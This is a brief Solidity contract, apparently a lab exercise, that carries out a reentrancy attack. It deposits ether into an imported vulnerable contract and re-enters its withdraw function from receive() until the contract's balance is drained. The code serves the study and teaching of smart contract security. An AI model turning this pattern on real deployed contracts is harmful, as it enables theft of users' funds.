// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../VulnerableContract.sol";

contract Attack {
 VulnerableContract public target;

 constructor(address _target) {
  target = VulnerableContract(_target);
 }

 receive() external payable {
  if (address(target).balance >= 1 ether) {
   target.withdarw();
  }
 }

 function attack() public payable {
  require(msg.value >= 1 ether, "Need to send at least 1 ether");
  target.deposit{value: 1 ether}();
  target.withdarw();
 }
}
